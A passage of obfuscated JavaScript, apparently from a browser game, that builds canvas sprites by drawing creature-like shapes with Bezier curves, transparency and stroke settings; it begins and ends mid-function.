			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 167 * ᐃ;
			Ⲇⵠ.height = 136 * ᐃ;
			Δ.globalAlpha = .5;
			Δ.save();
			Δ.translate(76.71426391601562 * ᐃ, 67.85713195800781 * ᐃ);
			Ⲇᐃᐃ(Δ, -57.5 * ᐃ, ᐃ * -54.5, ᐃ * 115, ᐃ * 109, ᐃ * ⲆᐃⲆΔⲆ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = .8;
			Δ.save();
			Δ.translate(76.71426391601562 * ᐃ, ᐃ * 67.85713195800781);
			Ⲇᐃᐃ(Δ, ᐃ * -57.5, ᐃ * -54.5, 115 * ᐃ, 109 * ᐃ, 15 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, ΔΔΔⲆΔ, Ⲇᐃ[ᐃΔᐃⲆ], ⵠᐃⲆᐃΔⲆⵠ * ᐃ);
			Δ.globalAlpha = .5;
			Δ.save();
			Δ.translate(ᐃ * 91.21426391601562, 67.35713195800781 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -56, ᐃ * -55, ᐃ * 115, 109 * ᐃ, 15 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔⵠⲆΔ;
			Δ.save();
			Δ.translate(91.21426391601562 * ᐃ, ᐃ * 67.35713195800781);
			Ⲇᐃᐃ(Δ, -56 * ᐃ, -55 * ᐃ, 115 * ᐃ, ᐃ * 109, ᐃⲆⵠⵠᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[1], 7 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 131.21426391601562, 70.35713195800781 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 133.21426391601562, 95.35713195800781 * ᐃ, ᐃ * 128.21426391601562, 109.35713195800781 * ᐃ, ᐃ * 108.21426391601562, ᐃ * 108.35713195800781);
			ΔⲆ(Δ, ⲆⲆⲆⲆᐃ, Ⲇᐃ[1], ᐃ * ⵠᐃⲆⲆΔ);
			return Ⲇⵠ
		}

		function ᐃᐃⵠⵠΔⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 198 * ᐃ;
			Ⲇⵠ.height = 147 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠᐃⵠΔ;
			Δ.translate(Δᐃᐃⵠ, 6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 44, 76 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 50, ᐃ * 82, ᐃ * 50, ᐃ * 82, ᐃ * 56, 88 * ᐃ);
			Δ.bezierCurveTo(59 * ᐃ, ᐃ * 82, 59 * ᐃ, 82 * ᐃ, ᐃ * 62, 76 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 59, 71 * ᐃ, ᐃ * 59, ᐃ * 71, ᐃ * 56, ᐃ * 66);
			Δ.bezierCurveTo(59 * ᐃ, 69 * ᐃ, ᐃ * 59, 69 * ᐃ, 62 * ᐃ, 72 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 80, ᐃ * 48, 102 * ᐃ, ᐃ * 50, 120 * ᐃ, ᐃ * 62);
			Δ.bezierCurveTo(127 * ᐃ, 58 * ᐃ, 127 * ᐃ, 58 * ᐃ, ᐃ * 134, ᐃ * 54);
			Δ.bezierCurveTo(129 * ᐃ, 60 * ᐃ, ᐃ * 129, ᐃ * 60, 124 * ᐃ, ᐃ * 66);
			Δ.bezierCurveTo(ᐃ * 129, 73 * ᐃ, 129 * ᐃ, 73 * ᐃ, 134 * ᐃ, ᐃ * 80);
			Δ.bezierCurveTo(140 * ᐃ, ᐃ * 74, 140 * ᐃ, 74 * ᐃ, ᐃ * 146, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 142, ᐃ * 76, 142 * ᐃ, 76 * ᐃ, 138 * ᐃ, 84 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 144, ᐃ * 90, 142 * ᐃ, ᐃ * 90, ᐃ * 144, ᐃ * 90);
			Δ.bezierCurveTo(ᐃ * 136, ᐃ * 97, ᐃ * 136, ᐃ * 97, 128 * ᐃ, 104 * ᐃ);
			Δ.bezierCurveTo(154 * ᐃ, 110 * ᐃ, ᐃ * 164, 90 * ᐃ, ᐃ * 160, ᐃ * 80);
			Δ.bezierCurveTo(ᐃ * 138, 22 * ᐃ, 148 * ᐃ, 51 * ᐃ, 136 * ᐃ, 22 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 97, ᐃ * 24, 97 * ᐃ, 24 * ᐃ, 58 * ᐃ, ᐃ * 26);
			Δ.bezierCurveTo(ᐃ * 47, ᐃ * 54, 36 * ᐃ, 80 * ᐃ, ᐃ * 36, ᐃ * 82);
			Δ.bezierCurveTo(ᐃ * 40, ᐃ * 108, ᐃ * 54, 104 * ᐃ, 62 * ᐃ, 104 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 46, ᐃ * 92, 54 * ᐃ, ᐃ * 97, 46 * ᐃ, 90 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 36, 80 * ᐃ);
			Δ.bezierCurveTo(30 * ᐃ, ᐃ * 84, ᐃ * 28, ᐃ * 92, ᐃ * 34, ᐃΔⲆⲆᐃ * ᐃ);
			Δ.bezierCurveTo(41.5 * ᐃ, 102 * ᐃ, 41.5 * ᐃ, 102 * ᐃ, 49 * ᐃ, 104 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 43, ᐃ * 105.5, 43 * ᐃ, 105.5 * ᐃ, ᐃ * 37, ᐃ * 107);
			Δ.bezierCurveTo(46 * ᐃ, 111 * ᐃ, ᐃ * 60, 114 * ᐃ, 76 * ᐃ, ᐃ * 114);
			Δ.bezierCurveTo(ᐃ * 78, 110.5 * ᐃ, ᐃ * 78, 110.5 * ᐃ, ᐃ * 80, 107 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 81, 110.5 * ᐃ, ᐃ * 81, ᐃ * 110.5, ᐃ * 82, ᐃ * 114);
			Δ.bezierCurveTo(94.5 * ᐃ, ᐃ * 113.5, ᐃ * 94.5, 113.5 * ᐃ, 107 * ᐃ, ᐃ * 113);
			Δ.bezierCurveTo(108.5 * ᐃ, 110 * ᐃ, ᐃ * 108.5, 110 * ᐃ, ᐃ * 110, ᐃ * 107);
			Δ.bezierCurveTo(111.5 * ᐃ, ᐃ * 110.5, ᐃ * 111.5, 110.5 * ᐃ, 113 * ᐃ, 114 * ᐃ);
			Δ.bezierCurveTo(131 * ᐃ, 112.5 * ᐃ, 131 * ᐃ, ᐃ * 112.5, ᐃ * 149, 111 * ᐃ);
			Δ.bezierCurveTo(148.5 * ᐃ, ᐃ * 107.5, 148.5 * ᐃ, ᐃ * 107.5, 148 * ᐃ, 104 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 150.5, ᐃ * 107, 150.5 * ᐃ, ᐃ * 107, ᐃ * 153, 110 * ᐃ);
			Δ.bezierCurveTo(155.5 * ᐃ, ᐃ * 108.5, ᐃ * 155.5, 108.5 * ᐃ, 158 * ᐃ, ᐃ * 107);
			Δ.bezierCurveTo(156.5 * ᐃ, ᐃ * 104, ᐃ * 156.5, 104 * ᐃ, ᐃ * 155, ᐃ * 101);
			Δ.bezierCurveTo(158.5 * ᐃ, 102.5 * ᐃ, 158.5 * ᐃ, ᐃ * 102.5, ᐃ * 162, 104 * ᐃ);
			Δ.bezierCurveTo(168 * ᐃ, ᐃ * ΔᐃⲆⲆⲆ, 170 * ᐃ, 92 * ᐃ, ᐃ * 169, ᐃ * 85);
			Δ.bezierCurveTo(ᐃ * 166, ᐃ * 86, 166 * ᐃ, ᐃ * 86, 163 * ᐃ, 87 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 165.5, 83 * ᐃ, 165.5 * ᐃ, 83 * ᐃ, 168 * ᐃ, 79 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 165.5, ᐃ * 76.5, ᐃ * 165.5, 76.5 * ᐃ, ᐃ * 163, ᐃ * 74);
			Δ.bezierCurveTo(ᐃ * 155, ᐃ * 82.5, 155 * ᐃ, 82.5 * ᐃ, ᐃ * 147, 91 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 139, 95.5 * ᐃ, 139 * ᐃ, 95.5 * ᐃ, 131 * ᐃ, ᐃΔⲆⲆᐃ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 97.5, 100.5 * ᐃ, 97.5 * ᐃ, 100.5 * ᐃ, 64 * ᐃ, ᐃ * 101);
			Δ.bezierCurveTo(49 * ᐃ, ᐃ * 102, ᐃ * 43, ᐃ * 90, ᐃ * 36, 80 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(ΔᐃΔΔ, -6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 36, ᐃ * 80);
			Δ.bezierCurveTo(30 * ᐃ, ᐃ * 84, ᐃ * 28, 92 * ᐃ, ᐃ * 34, ⲆⵠᐃΔⲆ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 41.5, ᐃ * 102, ᐃ * 41.5, 102 * ᐃ, ᐃ * 49, 104 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 43, ᐃ * 105.5, ᐃ * 43, ᐃ * 105.5, ᐃ * 37, ᐃ * 107);
			Δ.bezierCurveTo(46 * ᐃ, 111 * ᐃ, ᐃ * 60, ᐃ * 114, ᐃ * 76, ᐃ * 114);
			Δ.bezierCurveTo(78 * ᐃ, ᐃ * 110.5, ᐃ * 78, 110.5 * ᐃ, ᐃ * 80, ᐃ * 107);
			Δ.bezierCurveTo(ᐃ * 81, ᐃ * 110.5, 81 * ᐃ, 110.5 * ᐃ, 82 * ᐃ, ᐃ * 114);
			Δ.bezierCurveTo(ᐃ * 94.5, ᐃ * 113.5, ᐃ * 94.5, 113.5 * ᐃ, 107 * ᐃ, 113 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 108.5, 110 * ᐃ, 108.5 * ᐃ, 110 * ᐃ, 110 * ᐃ, ᐃ * 107);
			Δ.bezierCurveTo(111.5 * ᐃ, ᐃ * 110.5, ᐃ * 111.5, 110.5 * ᐃ, ᐃ * 113, ᐃ * 114);
			Δ.bezierCurveTo(ᐃ * 131, ᐃ * 112.5, ᐃ * 131, 112.5 * ᐃ, 149 * ᐃ, 111 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 148.5, 107.5 * ᐃ, ᐃ * 148.5, ᐃ * 107.5, ᐃ * 148, 104 * ᐃ);
			Δ.bezierCurveTo(150.5 * ᐃ, 107 * ᐃ, 150.5 * ᐃ, ᐃ * 107, 153 * ᐃ, ᐃ * 110);
			Δ.bezierCurveTo(155.5 * ᐃ, 108.5 * ᐃ, ᐃ * 155.5, ᐃ * 108.5, 158 * ᐃ, ᐃ * 107);
			Δ.bezierCurveTo(ᐃ * 156.5, ᐃ * 104, ᐃ * 156.5, 104 * ᐃ, 155 * ᐃ, ᐃ * 101);
			Δ.bezierCurveTo(158.5 * ᐃ, 102.5 * ᐃ, 158.5 * ᐃ, 102.5 * ᐃ, ᐃ * 162, 104 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 168, ᐃ * 100, 170 * ᐃ, 92 * ᐃ, 169 * ᐃ, ᐃ * 85);
			Δ.bezierCurveTo(166 * ᐃ, ᐃ * 86, ᐃ * 166, ᐃ * 86, 163 * ᐃ, 87 * ᐃ);
			Δ.bezierCurveTo(165.5 * ᐃ, 83 * ᐃ, 165.5 * ᐃ, 83 * ᐃ, 168 * ᐃ, ᐃ * 79);
			Δ.bezierCurveTo(165.5 * ᐃ, ᐃ * 76.5, 165.5 * ᐃ, ᐃ * 76.5, ᐃ * 163, 74 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 155, 82.5 * ᐃ, ᐃ * 155, 82.5 * ᐃ, ᐃ * 147, ᐃ * 91);
			Δ.bezierCurveTo(ᐃ * 139, 95.5 * ᐃ, 139 * ᐃ, ᐃ * 95.5, 131 * ᐃ, ᐃΔⲆⲆᐃ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 97.5, ᐃ * 100.5, ᐃ * 97.5, 100.5 * ᐃ, ᐃ * 64, ᐃ * 101);
			Δ.bezierCurveTo(ᐃ * 49, ᐃ * 102, ᐃ * 43, 90 * ᐃ, ᐃ * 36, 80 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠ], Ⲇᐃ[2], ᐃ * ⲆᐃᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(49 * ᐃ, ᐃ * 98);
			Δ.bezierCurveTo(ᐃ * 96.5, 98 * ᐃ, 96.5 * ᐃ, 98 * ᐃ, 144 * ᐃ, 98 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 136.5, 102 * ᐃ, ᐃ * 136.5, ᐃ * 102, ᐃ * 129, ᐃ * 106);
			Δ.bezierCurveTo(103 * ᐃ, 105.5 * ᐃ, ᐃ * 103, ᐃ * 105.5, 77 * ᐃ, 105 * ᐃ);
			Δ.bezierCurveTo(65 * ᐃ, ᐃ * 105, 65 * ᐃ, ᐃ * 105, ᐃ * 53, 105 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.globalAlpha = .5;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(54 * ᐃ, ᐃ * 98);
			Δ.bezierCurveTo(97 * ᐃ, 98 * ᐃ, 97 * ᐃ, ᐃ * 98, 140 * ᐃ, 98 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 134, 101 * ᐃ, 134 * ᐃ, 101 * ᐃ, 128 * ᐃ, ᐃ * 104);
			Δ.bezierCurveTo(ᐃ * 92, ᐃ * 104, 92 * ᐃ, 104 * ᐃ, 56 * ᐃ, ᐃ * 104);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 118, 47 * ᐃ);
			Δ.bezierCurveTo(124.5 * ᐃ, 43.5 * ᐃ, ᐃ * 124.5, ᐃ * 43.5, ᐃ * 131, 40 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 128, 46 * ᐃ, 128 * ᐃ, 46 * ᐃ, ᐃ * 125, 52 * ᐃ);
			Δ.bezierCurveTo(131 * ᐃ, ᐃ * 57, 135 * ᐃ, ᐃ * 64, 139 * ᐃ, 73 * ᐃ);
			Δ.bezierCurveTo(142.5 * ᐃ, 69.5 * ᐃ, 142.5 * ᐃ, 69.5 * ᐃ, ᐃ * 146, ᐃ * 66);
			Δ.bezierCurveTo(143.5 * ᐃ, ᐃ * 72.5, 143.5 * ᐃ, ᐃ * 72.5, 141 * ᐃ, 79 * ᐃ);
			Δ.bezierCurveTo(142 * ᐃ, ᐃ * 91, ᐃ * 141, ᐃ * 94, ᐃ * 132, ᐃ * 98);
			Δ.bezierCurveTo(117 * ᐃ, ᐃ * 102, 126 * ᐃ, ᐃ * 108, ᐃ * 142, ᐃ * 102);
			Δ.bezierCurveTo(159 * ᐃ, ᐃ * 98, ᐃ * 164, 80 * ᐃ, ᐃ * 162, ᐃ * 47);
			Δ.bezierCurveTo(160 * ᐃ, ᐃ * 19, 150 * ᐃ, 6 * ᐃ, ᐃ * 117, ΔⲆᐃⵠᐃ * ᐃ);
			Δ.bezierCurveTo(44 * ᐃ, ⵠᐃⲆᐃ * ᐃ, 35 * ᐃ, ᐃ * 20, ᐃ * 33, ᐃ * 37);
			Δ.bezierCurveTo(ᐃ * 29, ᐃ * 69, 33 * ᐃ, 88 * ᐃ, 44 * ᐃ, ᐃ * 96);
			Δ.bezierCurveTo(64 * ᐃ, 107 * ᐃ, ᐃ * 70, ᐃ * 102, 54 * ᐃ, 93 * ᐃ);
			Δ.bezierCurveTo(49 * ᐃ, ᐃ * 88, 50 * ᐃ, 82 * ᐃ, ᐃ * 53, 77 * ᐃ);
			Δ.bezierCurveTo(51.5 * ᐃ, ᐃ * 71, 51.5 * ᐃ, ᐃ * 71, ᐃ * 50, 65 * ᐃ);
			Δ.bezierCurveTo(53 * ᐃ, ᐃ * 68.5, ᐃ * 53, 68.5 * ᐃ, ᐃ * 56, 72 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 59, ᐃ * 67.5, 59 * ᐃ, 67.5 * ᐃ, ᐃ * 62, 63 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 60.5, ᐃ * 59.5, 60.5 * ᐃ, ᐃ * 59.5, 59 * ᐃ, 56 * ᐃ);
			Δ.bezierCurveTo(62 * ᐃ, 57 * ᐃ, ᐃ * 62, 57 * ᐃ, ᐃ * 65, 58 * ᐃ);
			Δ.bezierCurveTo(78 * ᐃ, 35 * ᐃ, 103 * ᐃ, 36 * ᐃ, ᐃ * 117, 47 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ], Ⲇᐃ[2], ᐃ * ⲆᐃⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 62, ᐃ * 21);
			Δ.bezierCurveTo(ᐃ * 63, ᐃ * 34, 64 * ᐃ, ᐃ * 37, 66 * ᐃ, 40 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 54, 49 * ᐃ, 53 * ᐃ, ᐃ * 51, ᐃ * 48, 58 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 44, ᐃ * 51, ᐃ * 42, 43 * ᐃ, 40 * ᐃ, 36 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 47, ᐃ * 28, ᐃ * 52, 25 * ᐃ, 61 * ᐃ, 21 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(60 * ᐃ, ᐃ * 29);
			Δ.bezierCurveTo(62 * ᐃ, ᐃ * 25, 65 * ᐃ, 24 * ᐃ, ᐃ * 70, 23 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ᐃᐃⲆⲆ], ΔΔⵠⵠΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(61 * ᐃ, ᐃ * 37);
			Δ.bezierCurveTo(63 * ᐃ, ᐃ * 32, ᐃ * 66, 32 * ᐃ, 71 * ᐃ, 32 * ᐃ);
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, Ⲇᐃ[3], ᐃ * Ⲇⵠⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(52 * ᐃ, ᐃ * 31);
			Δ.bezierCurveTo(ᐃ * 50, 26 * ᐃ, ᐃ * 50, ᐃ * 25, ᐃ * 51, 23 * ᐃ);
			ΔⲆ(Δ, ⵠⵠⵠⲆⵠ, Ⲇᐃ[3], ᐃ * ᐃⲆᐃⲆⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(46 * ᐃ, 35 * ᐃ);
			Δ.bezierCurveTo(44 * ᐃ, ᐃ * 31, ᐃ * 43, ᐃ * 29, ᐃ * 45, ᐃ * 26);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠᐃⵠⲆ], ᐃ * ᐃⵠⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 58, 44 * ᐃ);
			Δ.bezierCurveTo(57 * ᐃ, 48 * ᐃ, 57 * ᐃ, 50 * ᐃ, ᐃ * 60, 52 * ᐃ);
			ΔⲆ(Δ, ⵠⵠᐃᐃᐃ, Ⲇᐃ[3], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(53 * ᐃ, 48 * ᐃ);
			Δ.bezierCurveTo(52 * ᐃ, 52 * ᐃ, 52 * ᐃ, 54 * ᐃ, ᐃ * 55, ᐃ * 57);
			ΔⲆ(Δ, undefined, Ⲇᐃ[3], ⲆⵠΔⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 46, 41 * ᐃ);
			Δ.bezierCurveTo(41 * ᐃ, ᐃ * 42, ᐃ * 39, 45 * ᐃ, 38 * ᐃ, ᐃ * 48);
			ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[3], ⵠΔᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 48, 48 * ᐃ);
			Δ.bezierCurveTo(42 * ᐃ, ᐃ * 51, ᐃ * 42, 53 * ᐃ, 40 * ᐃ, 55 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ᐃᐃⲆⲆ], 4 * ᐃ);
			if (0 == ⵠᐃ) {
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(99 * ᐃ, ᐃ * 101);
				Δ.bezierCurveTo(ᐃ * 118.6666259765625, 104.33331298828125 * ᐃ, ᐃ * 124.6666259765625, 116.33331298828125 * ᐃ, 112.6666259765625 * ᐃ, 114.33331298828125 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 104.6666259765625, 112.33331298828125 * ᐃ, 100.6666259765625 * ᐃ, 105.33331298828125 * ᐃ, 99.6666259765625 * ᐃ, 101.33331298828125 * ᐃ);
				ΔⲆ(Δ, ᐃⵠᐃⵠᐃ, Ⲇᐃ[ᐃᐃⲆᐃ], ⵠᐃᐃΔ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
				Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
				Δ.moveTo(97.6666259765625 * ᐃ, 101.33331298828125 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 81.6666259765625, ᐃ * 106.33331298828125, 79.6666259765625 * ᐃ, 114.33331298828125 * ᐃ, 89.6666259765625 * ᐃ, 114.33331298828125 * ᐃ);
				Δ.bezierCurveTo(95.6666259765625 * ᐃ, 111.33331298828125 * ᐃ, ᐃ * 95.6666259765625, 109.33331298828125 * ᐃ, ᐃ * 98.6666259765625, 102.33331298828125 * ᐃ);
				ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[5], ᐃ * 6)
			} else {
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
				Δ.moveTo(ᐃ * 103, 100.39999389648438 * ᐃ);
				Δ.bezierCurveTo(120 * ᐃ, ᐃ * 106.39999389648438, ᐃ * 118, 107.39999389648438 * ᐃ, 120 * ᐃ, ᐃ * 111.39999389648438);
				ΔⲆ(Δ, ⵠⵠΔⵠΔ, Ⲇᐃ[5], ⵠᐃᐃΔΔ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(103 * ᐃ, 100.39999389648438 * ᐃ);
				Δ.bezierCurveTo(90 * ᐃ, ᐃ * 103.39999389648438, ᐃ * 89, 106.39999389648438 * ᐃ, 87 * ᐃ, 112.39999389648438 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[5], ΔⵠⵠⲆΔ * ᐃ);
				ⵠᐃᐃ(Δ, 86 * ᐃ, 114.39999389648438 * ᐃ, 4.5 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ], Ⲇᐃ[ⵠⵠᐃⵠ], ᐃ * ⵠΔᐃΔⲆ);
				ⵠᐃᐃ(Δ, ᐃ * 121, ᐃ * 114.39999389648438, ᐃ * 4.5);
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔⵠΔ], Ⲇᐃ[ⵠⵠᐃⵠ], 6 * ᐃ)
			}
			return Ⲇⵠ
		}

		function ⵠⲆⵠⲆⲆⵠⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 144 * ᐃ;
			Ⲇⵠ.height = ᐃ * 280;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : Ⲇᐃⵠ;
			Δ.translate(5 * ᐃ, 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 62, ᐃ * 103.79999542236328);
			Δ.bezierCurveTo(62.5 * ᐃ, ᐃ * 148.79999542236328, 62.5 * ᐃ, ᐃ * 148.79999542236328, 63 * ᐃ, ᐃ * 193.79999542236328);
			Δ.bezierCurveTo(ᐃ * 63, 219.79999542236328 * ᐃ, ᐃ * 47, 217.79999542236328 * ᐃ, ᐃ * 51, 230.79999542236328 * ᐃ);
			Δ.bezierCurveTo(62 * ᐃ, ᐃ * 255.79999542236328, ᐃ * 74, 260.7999954223633 * ᐃ, ᐃ * 72, 248.79999542236328 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 65, 226.79999542236328 * ᐃ, 71 * ᐃ, 229.79999542236328 * ᐃ, 76 * ᐃ, 225.79999542236328 * ᐃ);
			Δ.bezierCurveTo(90 * ᐃ, ᐃ * 224.79999542236328, 89 * ᐃ, ᐃ * 232.79999542236328, ᐃ * 90, 243.79999542236328 * ᐃ);
			Δ.bezierCurveTo(95 * ᐃ, 253.79999542236328 * ᐃ, ᐃ * 99, ᐃ * 249.79999542236328, ᐃⲆΔⲆⵠ * ᐃ, 229.79999542236328 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102, 213.79999542236328 * ᐃ, ᐃ * 98, ᐃ * 214.79999542236328, 90 * ᐃ, ᐃ * 205.79999542236328);
			Δ.bezierCurveTo(82 * ᐃ, ᐃ * 201.79999542236328, ᐃ * 82, 185.79999542236328 * ᐃ, 82 * ᐃ, ᐃ * 114.79999542236328);
			Δ.bezierCurveTo(80 * ᐃ, ᐃ * 73, 82 * ᐃ, ᐃ * 68, ᐃ * 93, 53 * ᐃ);
			Δ.bezierCurveTo(98 * ᐃ, 37 * ᐃ, 65 * ᐃ, ⵠᐃⵠΔᐃ * ᐃ, 74 * ᐃ, ᐃ * 33);
			Δ.bezierCurveTo(82 * ᐃ, ᐃ * 56, 77 * ᐃ, ᐃ * 52, 69 * ᐃ, 54 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 55, 57 * ᐃ, ᐃ * 57, ᐃ * 53, 54 * ᐃ, ᐃ * 39);
			Δ.bezierCurveTo(46 * ᐃ, ᐃ * ⵠΔΔⲆⲆ, ᐃ * 37, ᐃ * 61, ᐃ * 50, 68 * ᐃ);
			Δ.bezierCurveTo(65 * ᐃ, ᐃ * 81, ᐃ * 60, ᐃ * 89, 62 * ᐃ, ᐃ * 102);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ⵠΔⵠΔ;
			Δ.translate(ᐃ * -ⵠᐃⲆΔ, ᐃ * -5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 62, ᐃ * 103.79999542236328);
			Δ.bezierCurveTo(62.5 * ᐃ, 148.79999542236328 * ᐃ, ᐃ * 62.5, 148.79999542236328 * ᐃ, ᐃ * 63, ᐃ * 193.79999542236328);
			Δ.bezierCurveTo(ᐃ * 63, ᐃ * 219.79999542236328, 47 * ᐃ, ᐃ * 217.79999542236328, ᐃ * 51, 230.79999542236328 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 62, ᐃ * 255.79999542236328, 74 * ᐃ, 260.7999954223633 * ᐃ, ᐃ * 72, 248.79999542236328 * ᐃ);
